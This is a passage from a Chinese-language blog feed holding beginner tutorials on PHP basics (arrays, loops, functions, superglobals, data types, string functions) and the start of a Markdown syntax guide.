class="hljs-symbol">$cars</span>[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;lisa&quot;</span>;<span class="hljs-symbol">$cars</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&quot;jennie&quot;</span>;<span class="hljs-symbol">$cars</span>[<span class="hljs-number">3</span>]=<span class="hljs-string">&quot;jisoo&quot;</span>;</code></pre><h4 id="遍历数值数组"><a class="header-anchor" href="#遍历数值数组">🍭</a>遍历数值数组:</h4><p>遍历并打印数值数组中的所有值，可以使用 for 循环。</p><h4 id="关联数组"><a class="header-anchor" href="#关联数组">🍭</a>关联数组:</h4><p>使用分配给数组的指定的键的数组。</p><p>法一:</p><pre><code class="hljs php">$age=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Jane&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;Ben&quot;</span>=&gt;<span class="hljs-string">&quot;37&quot;</span>,<span class="hljs-string">&quot;Joe&quot;</span>=&gt;<span class="hljs-string">&quot;43&quot;</span>);</code></pre><p>法二：</p><pre><code class="hljs arcade"><span class="hljs-symbol">$age</span>[<span class="hljs-string">&#x27;Jane&#x27;</span>]=<span class="hljs-string">&quot;35&quot;</span>;<span class="hljs-symbol">$age</span>[<span class="hljs-string">&#x27;Ben&#x27;</span>]=<span class="hljs-string">&quot;37&quot;</span>;<span class="hljs-symbol">$age</span>[<span class="hljs-string">&#x27;Joe&#x27;</span>]=<span class="hljs-string">&quot;43&quot;</span>;</code></pre><h2 id="PHP-数组排序"><a class="header-anchor" href="#PHP-数组排序">🍭</a>PHP 数组排序</h2><p>数组中的元素可以按字母或数字顺序进行降序或升序排列。</p><ul><li>sort() - 对数组进行升序排列</li><li>rsort() - 对数组进行降序排列</li><li>asort() - 根据数组的值，对数组进行升序排列</li><li>ksort() - 根据数组的键，对数组进行升序排列</li></ul><h2 id="PHP-超级全局变量"><a class="header-anchor" href="#PHP-超级全局变量">🍭</a>PHP 超级全局变量</h2><p>超级变量在全部作用域中都可用，不需要特别说明。</p><h4 id="GLOBALS"><a class="header-anchor" href="#GLOBALS">🍭</a>$GLOBALS</h4><p>包含了全部变量的全局组合数组</p><h4 id="SERVER"><a class="header-anchor" href="#SERVER">🍭</a>$_SERVER</h4><p>包含了头信息(header)、路径(path)、以及脚本位置(script locations)等信息的数组，数组中的项目由 Web 服务器创建。</p><h4 id="REQUEST"><a class="header-anchor" href="#REQUEST">🍭</a>$_REQUEST</h4><p>用于收集HTML表单提交的数据。以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至<form>标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据。</form></p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="xml"> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;</span></span></span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>];<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="xml">Name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml"> </span><span class="php"><span class="hljs-meta">&lt;?php</span> </span><span class="php">$name = $_REQUEST[<span class="hljs-string">&#x27;fname&#x27;</span>]; </span><span class="php"><span class="hljs-keyword">echo</span> $name; </span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"> </span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><h4 id="POST"><a class="header-anchor" href="#POST">🍭</a>$_POST</h4><p>用于收集表单数据，在HTML form标签的指定该属性：&quot;method=“post”。(用法与上述$_REQUEST类似)</p><h4 id="GET"><a class="header-anchor" href="#GET">🍭</a>$_GET</h4><p>$GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：&quot;method=“get”。$_GET 也可以收集URL中发送的数据。</p><h2 id="PHP-循环"><a class="header-anchor" href="#PHP-循环">🍭</a>PHP 循环</h2><h4 id="while"><a class="header-anchor" href="#while">🍭</a>while</h4><p>只要指定的条件成立，则循环执行代码块。</p><p>语法如下：</p><pre><code class="hljs gauss"><span class="hljs-keyword">while</span> (条件)&#123;    要执行的代码;&#125;</code></pre><p>以下实例变量 <em>i</em> 的初始值为 9。然后只要 <em>i</em> 小于或者等于 13，while 循环将继续运行。循环每运行一次，<em>i</em> 就会递增 1：</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$i=<span class="hljs-number">9</span>;</span><span class="php"><span class="hljs-keyword">while</span>($i&lt;=<span class="hljs-number">13</span>)</span><span class="php">&#123;</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The number is &quot;</span> . $i . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><span class="php">    $i++;</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><p>运行结果如下：</p><pre><code class="hljs angelscript">The number <span class="hljs-keyword">is</span> <span class="hljs-number">9</span>The number <span class="hljs-keyword">is</span> <span class="hljs-number">10</span>The number <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>The number <span class="hljs-keyword">is</span> <span class="hljs-number">12</span>The number <span class="hljs-keyword">is</span> <span class="hljs-number">13</span></code></pre><h4 id="do…while-语句"><a class="header-anchor" href="#do…while-语句">🍭</a>do…while 语句</h4><p>do…while 语句执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</p><p>语法如下:</p><pre><code class="hljs gauss"><span class="hljs-keyword">do</span>&#123;    要执行的代码;&#125;<span class="hljs-keyword">while</span> (条件);</code></pre><h4 id="for-循环"><a class="header-anchor" href="#for-循环">🍭</a>for 循环</h4><p>for 循环用于预先知道脚本需要运行的次数的情况。</p><p>语法如下：其中的<strong>初始值</strong>和<strong>增量</strong>参数可为空或者有多个表达式（用逗号分隔）。</p><pre><code class="hljs abnf">for (初始值<span class="hljs-comment">; 条件; 增量)</span>&#123;    要执行的代码<span class="hljs-comment">;</span>&#125;</code></pre><p>实例如下:定义一个初始值为 i=8的循环，只要变量 <strong>i</strong> 小于或者等于 10，循环将继续运行。循环每运行一次，变量 <strong>i</strong> 就会递增 1：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">for</span> ($i=<span class="hljs-number">8</span>; $i&lt;=<span class="hljs-number">10</span>; $i++)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i= &quot;</span> . $i . PHP_EOL;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>结果如下:</p><pre><code class="hljs ini"><span class="hljs-attr">i</span>= <span class="hljs-number">8</span><span class="hljs-attr">i</span>= <span class="hljs-number">9</span><span class="hljs-attr">i</span>= <span class="hljs-number">10</span></code></pre><h4 id="foreach-循环"><a class="header-anchor" href="#foreach-循环">🍭</a>foreach 循环</h4><p>foreach 循环用于遍历数组。</p><p>语法如下：</p><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> ($array <span class="hljs-keyword">as</span> $value)&#123;    要执行代码;&#125;</code></pre><p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> ($array <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;    要执行代码;&#125;</code></pre><p>语法与上面类似，但下面的语法中元素的键与值都会被赋值给 $key 和 $value 变量。</p><h2 id="PHP-函数"><a class="header-anchor" href="#PHP-函数">🍭</a>PHP 函数</h2><p>函数是通过调用函数来执行的,可以在页面的任何位置调用函数。</p><h4 id="创建-PHP-函数"><a class="header-anchor" href="#创建-PHP-函数">🍭</a>创建 PHP 函数</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">functionName</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// 要执行的代码</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li><strong>函数的名称应该提示出它的功能</strong></li><li><strong>函数名称以字母或下划线开头（不能以数字开头）</strong></li></ul><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_song</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wonderful u&quot;</span>;&#125; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I want to listen to &quot;</span>;write_song();<span class="hljs-meta">?&gt;</span></code></pre><p>结果为 ：I want to listen to wonderful u.</p><h4 id="PHP-函数-添加参数"><a class="header-anchor" href="#PHP-函数-添加参数">🍭</a>PHP 函数 - 添加参数</h4><p>参数类似变量,参数就在函数名称后面的一个括号内指定。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">idol</span>(<span class="hljs-params">$combination,$punctuation</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">echo</span> $combination . <span class="hljs-string">&quot; blackpink&quot;</span> . $punctuation . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My first idol is &quot;</span>;idol(<span class="hljs-string">&quot;rose&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My second idol is &quot;</span>;idol(<span class="hljs-string">&quot;lisa&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My third idol is &quot;</span>;idol(<span class="hljs-string">&quot;jennie&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My forth idol is &quot;</span>;idol(<span class="hljs-string">&quot;jisoo&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>输出如下：</p><pre><code class="hljs applescript">My <span class="hljs-keyword">first</span> idol <span class="hljs-keyword">is</span> rose blackpink.My <span class="hljs-keyword">second</span> idol <span class="hljs-keyword">is</span> lisa blackpink!My <span class="hljs-keyword">third</span> idol <span class="hljs-keyword">is</span> jennie blackpink?My forth idol <span class="hljs-keyword">is</span> jisoo blackpink?</code></pre><h2 id="PHP-魔术常量"><a class="header-anchor" href="#PHP-魔术常量">🍭</a>PHP 魔术常量</h2><p>魔术常量的值随着它们在代码中的位置改变而改变。魔术常量的两边都要加上两个下划线。</p><h4 id="LINE"><a class="header-anchor" href="#LINE">🍭</a><strong>LINE</strong></h4><p>文件中的当前行号。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;这是第 &quot; &#x27;</span>  . <span class="hljs-keyword">__LINE__</span> . <span class="hljs-string">&#x27; &quot; 行&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>以上实例输出结果为：</p><pre><code class="hljs angelscript">这是第 “ <span class="hljs-number">2</span> ” 行</code></pre><h4 id="FILE"><a class="header-anchor" href="#FILE">🍭</a><strong>FILE</strong></h4><p>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。</p><h4 id="DIR"><a class="header-anchor" href="#DIR">🍭</a><strong>DIR</strong></h4><p>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。</p><p>它等价于 <strong>FILE</strong>，如果是根目录，则目录中名包括末尾的斜杠。</p><h4 id="FUNCTION"><a class="header-anchor" href="#FUNCTION">🍭</a><strong>FUNCTION</strong></h4><p>返回该函数被定义时的名字（区分大小写）。</p><h4 id="CLASS"><a class="header-anchor" href="#CLASS">🍭</a><strong>CLASS</strong></h4><p>返回该类被定义时的名字（区分大小写），类名包括其被声明的作用区域。</p><h4 id="METHOD"><a class="header-anchor" href="#METHOD">🍭</a><strong>METHOD</strong></h4><p>返回该方法被定义时的名字（区分大小写）。</p><h4 id="NAMESPACE"><a class="header-anchor" href="#NAMESPACE">🍭</a><strong>NAMESPACE</strong></h4><p>当前命名空间的名称（区分大小写），此常量是在编译时定义的。</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php(一)</title>
    <link href="/2020/10/10/php%20(%E4%B8%80)/"/>
    <url>/2020/10/10/php%20(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h1>PHP（一）</h1><ul><li><p>PHP（全称：PHP：Hypertext Preprocessor，即&quot;PHP：超文本预处理器&quot;）是一种通用开源脚本语言。</p></li><li><p>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</p></li><li><p>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</p></li><li><p>PHP 文件的默认文件扩展名是 “.php”</p></li><li><p><a href="#php%E4%B8%80">PHP（一）</a></p><ul><li><a href="#%E5%8F%98%E9%87%8F">变量</a><ul><li><a href="#php-%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F">PHP 变量作用域</a><ul><li><a href="#global%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>Global:全局变量作用域</strong></a></li><li><a href="#static-%E9%9D%99%E6%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>Static :静态作用域</strong></a></li><li><a href="#local%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>local:局部变量的作用域</strong></a></li><li><a href="#parameter%E5%8F%82%E6%95%B0%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>parameter：参数作用域</strong></a></li></ul></li></ul></li><li><a href="#php-echo-%E5%92%8C-print-%E8%AF%AD%E5%8F%A5">PHP echo 和 print 语句</a></li><li><a href="#php-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">PHP  数据类型</a><ul><li><a href="#php-%E5%AD%97%E7%AC%A6%E4%B8%B2string">PHP 字符串(string)</a></li><li><a href="#php-%E5%B9%B6%E7%BD%AE%E8%BF%90%E7%AE%97%E7%AC%A6">PHP 并置运算符</a></li><li><a href="#php-%E6%95%B4%E5%9E%8Binteger">PHP 整型(Integer)</a></li><li><a href="#php-%E6%B5%AE%E7%82%B9%E5%9E%8Bfloat">PHP 浮点型（float）</a></li><li><a href="#php-%E5%B8%83%E5%B0%94%E5%9E%8B-boolean">PHP 布尔型( Boolean)</a></li><li><a href="#php-%E6%95%B0%E7%BB%84array">PHP 数组(array)</a></li><li><a href="#php-%E5%AF%B9%E8%B1%A1">PHP 对象</a></li><li><a href="#php-null-%E5%80%BC">PHP NULL 值</a></li></ul></li><li><a href="#php-%E5%B8%B8%E9%87%8F">PHP 常量</a><ul><li><a href="#%E8%AE%BE%E7%BD%AE-php-%E5%B8%B8%E9%87%8F">设置 PHP 常量</a></li><li><a href="#php-strlen-%E5%87%BD%E6%95%B0">PHP strlen() 函数</a></li><li><a href="#php-strpos-%E5%87%BD%E6%95%B0">PHP strpos() 函数</a></li></ul></li></ul></li></ul><h2 id="变量"><a class="header-anchor" href="#变量">🍭</a>变量</h2><p>变量是用于存储信息的&quot;容器&quot;。（php与C语言比较类似）</p><ul><li>变量以 $ 符号开始，后面跟着变量的名称</li><li><strong>变量名必须以字母或者下划线字符开始</strong></li><li>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</li><li>变量名不能包含空格</li><li>变量名和语句都是区分大小写的（$y 和 $Y 是两个不同的变量）</li><li>赋一个文本值给变量时，需在文本值两侧加上引号。</li></ul><h3 id="PHP-变量作用域"><a class="header-anchor" href="#PHP-变量作用域">🍭</a>PHP 变量作用域</h3><p>变量的作用域是脚本中变量可被引用/使用的部分。</p><h5 id="Global-全局变量作用域"><a class="header-anchor" href="#Global-全局变量作用域">🍭</a><strong>Global:全局变量作用域</strong></h5><p>除了函数外，全局变量(即在函数外声明，无法在函数内声明的变量。同理:在函数内声明,无法在函数外声明的变量为局部变量。**因此可以在不同函数中使用相同的变量名称，因为这些函数内定义的变量名是局部变量，只作用于该函数内。**关于局部变量和全局变量的优先级，因为在PHP中函数都有自己单独的作用域，所以在局部变量的优先级要大于全局变量（在你不声明这个变量之前），声明之后此变量就变成了局部变量如果修改值那么全局变量的值也会改变。)可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p><p>在源代码中，global $x,$y;    $y=$x+$y; 和 $GLOBALS[‘y’]=$GLOBALS[‘x’]+$GLOBALS[‘y’]; 是等效的。</p><h5 id="Static-静态作用域"><a class="header-anchor" href="#Static-静态作用域">🍭</a><strong>Static :静态作用域</strong></h5><p>当一个函数完成时，它的所有变量通常都会被删除。但有时候您希望某个局部变量不要被删除可以在您第一次声明变量时使用 <strong>static</strong> 关键字。每次调用该函数时，该变量将会保留着函数前一次被调用时的值。</p><h5 id="local-局部变量的作用域"><a class="header-anchor" href="#local-局部变量的作用域">🍭</a><strong>local:局部变量的作用域</strong></h5><p>在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。</p><h5 id="parameter：参数作用域"><a class="header-anchor" href="#parameter：参数作用域">🍭</a><strong>parameter：参数作用域</strong></h5><p>参数是通过调用代码将值传递给函数的局部变量。</p><h2 id="PHP-echo-和-print-语句"><a class="header-anchor" href="#PHP-echo-和-print-语句">🍭</a>PHP echo 和 print 语句</h2><ul><li>echo - 可以输出一个或多个字符串(字符串可以包含 HTML 标签)</li><li>print - 只允许输出一个字符串，返回值总为 1</li><li>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</li></ul><h2 id="PHP-数据类型"><a class="header-anchor" href="#PHP-数据类型">🍭</a>PHP  数据类型</h2><h4 id="PHP-字符串-string"><a class="header-anchor" href="#PHP-字符串-string">🍭</a>PHP 字符串(string)</h4><p>一个字符串是一串字符的序列,可以将任何文本放在单引号和双引号中。字符串变量用于包含有字符的值。</p><h4 id="PHP-并置运算符"><a class="header-anchor" href="#PHP-并置运算符">🍭</a>PHP 并置运算符</h4><p>并置运算符 (.) 用于把两个字符串值连接起来。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$txt1=<span class="hljs-string">&quot;What a handsome boy!&quot;</span>;$txt2=<span class="hljs-string">&quot;I want to pursue him!&quot;</span>;<span class="hljs-keyword">echo</span> $txt1 . <span class="hljs-string">&quot; &quot;</span> . $txt2;<span class="hljs-meta">?&gt;</span></code></pre><p>上面的代码将输出：What a handsome boy!I want to pursue him!</p><h4 id="PHP-整型-Integer"><a class="header-anchor" href="#PHP-整型-Integer">🍭</a>PHP 整型(Integer)</h4><ul><li>整数必须至少有一个数字 (0-9)</li><li>整数不能包含逗号或空格</li><li>整数是没有小数点的</li><li>整数可以是正数或负数</li><li>整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）.</li></ul><h4 id="PHP-浮点型（float）"><a class="header-anchor" href="#PHP-浮点型（float）">🍭</a>PHP 浮点型（float）</h4><p>浮点数是带小数部分的数字，或是指数形式。</p><h4 id="PHP-布尔型-Boolean"><a class="header-anchor" href="#PHP-布尔型-Boolean">🍭</a>PHP 布尔型( Boolean)</h4><p>布尔型可以是 TRUE 或 FALSE，通常用于条件判断。</p><h4 id="PHP-数组-array"><a class="header-anchor" href="#PHP-数组-array">🍭</a>PHP 数组(array)</h4><p>数组可以在一个变量中存储多个值。</p><h4 id="PHP-对象"><a class="header-anchor" href="#PHP-对象">🍭</a>PHP 对象</h4><p>对象数据类型也可以用于存储数据.在 PHP 中，必须使用class关键字声明类对象,类是可以包含属性和方法的结构。PHP关键字this指向当前对象实例的指针，不指向任何其他对象或类。</p><h4 id="PHP-NULL-值"><a class="header-anchor" href="#PHP-NULL-值">🍭</a>PHP NULL 值</h4><p>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。</p><p>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。</p><h2 id="PHP-常量"><a class="header-anchor" href="#PHP-常量">🍭</a>PHP 常量</h2><p>常量是一个简单值的标识符。该值在脚本的其它任何地方都不能改变。一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符,不然会将常量转换成新的未定义变量使用，会导致报错)。<strong>常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</strong></p><h4 id="设置-PHP-常量"><a class="header-anchor" href="#设置-PHP-常量">🍭</a>设置 PHP 常量</h4><p>define() 函数:</p><pre><code class="hljs lasso">bool <span class="hljs-class"><span class="hljs-keyword">define</span> </span>( <span class="hljs-built_in">string</span> $name , mixed $value <span class="hljs-meta">[</span>, bool $case_insensitive = <span class="hljs-literal">false</span> <span class="hljs-meta">]</span> )</code></pre><ul><li>**name：**必选参数，常量名称，即标志符。</li><li>**value：**必选参数，常量的值。</li><li><strong>case_insensitive</strong> ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li></ul><h4 id="PHP-strlen-函数"><a class="header-anchor" href="#PHP-strlen-函数">🍭</a>PHP strlen() 函数</h4><p>常常用在循环和其他函数中</p><p>strlen() 函数返回字符串的长度（字节数）</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> strlen(<span class="hljs-string">&quot;功夫熊猫&quot;</span>);   <span class="hljs-comment">// 输出 12</span><span class="hljs-meta">?&gt;</span></code></pre><p>输出结果为 12，因为一个中文占 3 个字符数。</p><p>可以使用 mb_strlen 设置指定编码输出中文字符个数(中文下的字符在 UTF-8 下是 3 个字符长度，在 gbk 下是2个字符长度)</p><h4 id="PHP-strpos-函数"><a class="header-anchor" href="#PHP-strpos-函数">🍭</a>PHP strpos() 函数</h4><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。(mb_strpos 按字处理，strpos 按字符处理)</p><p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> strpos(<span class="hljs-string">&quot;what a handsome boy!&quot;</span>,<span class="hljs-string">&quot;handsome&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>上面的代码将输出：7</p><p>在上面的实例中，字符串 “handsome” 的位置是 7。之所以是 7而不是 8 的原因是，字符串中第一个字符的位置是 0，而不是 1。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>markdown</title>
    <link href="/2020/10/09/markdown/"/>
    <url>/2020/10/09/markdown/</url>
    
    <content type="html"><![CDATA[<h1>MarkDown：</h1><ul><li><a href="#markdown">MarkDown：</a><ul><li><em><a href="#%E4%B8%80%E7%BC%96%E8%BE%91%E5%99%A8">一、编辑器</a></em></li><li><em><a href="#%E4%BA%8C%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">二、基本用法</a></em></li><li><em><a href="#%E4%B8%89%E8%AF%AD%E6%B3%95">三、语法</a></em><ul><li><em><a href="#1%E6%A0%87%E9%A2%98">1、标题</a></em></li><li><em><a href="#2%E6%96%87%E5%AD%97%E6%A0%BC%E5%BC%8F">2、文字格式</a></em><ul><li><em><a href="#1%E7%B2%97%E4%BD%93">(1)粗体：</a></em></li><li><em><a href="#2%E6%96%9C%E4%BD%93">(2)斜体：</a></em></li><li><em><a href="#3%E7%B2%97%E6%96%9C%E4%BD%93">(3)粗斜体：</a></em></li><li><em><a href="#4%E5%88%A0%E9%99%A4">(4)删除:</a></em></li></ul></li></ul></li><li><em><a href="#3%E5%88%97%E8%A1%A8">3、列表</a></em><ul><li><em><a href="#1%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8">(1)无序列表：</a></em></li><li><em><a href="#2%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8">(2)有序列表:</a></em></li></ul></li><li><em><a href="#4%E9%93%BE%E6%8E%A5">4、链接</a></em><ul><li><em><a href="#1%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E8%A1%8C%E5%86%85%E5%BD%A2%E5%BC%8F">(1)直接设置（行内形式)</a></em></li><li><em><a href="#2%E9%97%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E5%8F%82%E8%80%83%E5%BD%A2%E5%BC%8F">(2)间接设置（参考形式）</a></em></li><li><em><a href="#3%E9%9A%90%E5%BC%8F%E8%AE%BE%E7%BD%AE">(3）隐式设置</a></em></li></ul></li><li><em><a href="#5%E5%9B%BE%E7%89%87">5、图片</a></em></li><li><em><a href="#6%E5%BC%95%E7%94%A8">6、引用</a></em></li><li><em><a href="#7%E6%B0%B4%E5%B9%B3%E5%88%86%E5%89%B2%E7%BA%BF">7、水平分割线</a></em></li><li><em><a href="#8%E8%A1%A8%E6%A0%BC">8、表格</a></em></li><li><em><a href="#9%E4%BB%A3%E7%A0%81">9、代码</a></em><ul><li><em><a href="#1%E4%BB%A3%E7%A0%81%E5%8F%A5">(1）代码句</a></em></li><li><em><a href="#2%E4%BB%A3%E7%A0%81%E6%AE%B5">(2）代码段</a></em></li><li><em><a href="#3%E7%94%A8%E4%B8%89%E4%B8%AA%E4%BB%A5%E4%B8%8A%E7%9A%84%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%AE%9A%E4%B9%89%E6%AE%B5%E5%BC%80%E5%A7%8B%E5%92%8C%E7%BB%93%E6%9D%9F">(3）用三个以上的反引号定义段开始和结束</a></em></li></ul></li><li><em><a href="#10%E7%9B%AE%E5%BD%95">10、目录</a></em></li><li><em><a href="#11%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">11、转义字符</a></em></li><li><em><a href="#12uml%E5%9B%BE">12、UML图</a></em><ul><li><em><a href="#%E6%B8%B2%E6%9F%93%E5%BA%8F%E5%88%97%E5%9B%BE">渲染序列图：</a></em></li></ul></li></ul></li></ul><h2 id="一、编辑器"><a class="header-anchor" href="#一、编辑器">🍭</a><em>一、编辑器</em></h2><p><strong>1、MarkDown Pad2</strong></p><p><a href="http://markdownpad.com/">MarkDown Pad2</a>目前用的人多，它可以边写边预览效果，免费生成html文档，但生成pdf文档须升级成专业版。</p><p><strong>2、Typora（推荐）</strong></p><p><a href="https://www.typora.io/">Typora</a>较为便利，输入标记符号后，软件会自动对标记的文本进行渲染，生成格式。</p><h2 id="二、基本用法"><a class="header-anchor" href="#二、基本用法">🍭</a><em>二、基本用法</em></h2><p>1、单个回车=空格<br>2、连续回车=分段<br>3、行尾加两个空格=段内换行<br>4、HTML的注释</p><h2 id="三、语法"><a class="header-anchor" href="#三、语法">🍭</a><em>三、语法</em></h2><h3 id="1、标题"><a class="header-anchor" href="#1、标题">🍭</a>1、标题</h3><p>#号之后记得空格，共有六级标题，以此类推。</p><p><img src="/2020/10/09/markdown/%E6%A0%87%E9%A2%98.jpg" alt="标题"></p><h3 id="2、文字格式"><a class="header-anchor" href="#2、文字格式">🍭</a>2、文字格式</h3><h4 id="1-粗体："><a class="header-anchor" href="#1-粗体：">🍭</a>(1)粗体：</h4><p>将需要设置为斜体的文字两端使用2个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E6%96%9C%E4%BD%93.jpg" alt="斜体"></p><h4 id="2-斜体："><a class="header-anchor" href="#2-斜体：">🍭</a>(2)斜体：</h4><p>将需要设置为斜体的文字两端使用1个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E6%96%9C.jpg" alt="斜"></p><h4 id="3-粗斜体："><a class="header-anchor" href="#3-粗斜体：">🍭</a>(3)粗斜体：</h4><p>将需要设置为斜体的文字两端使用3个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E7%B2%97%E6%96%9C.jpg" alt="粗斜"></p><h4 id="4-删除"><a class="header-anchor" href="#4-删除">🍭</a>(4)删除:</h4><p>使用2个~号即可。</p><p><img src="/2020/10/09/markdown/%E5%88%A0.jpg" alt="删"></p><h2 id="3、列表"><a class="header-anchor" href="#3、列表">🍭</a>3、列表</h2><h3 id="1-无序列表："><a class="header-anchor" 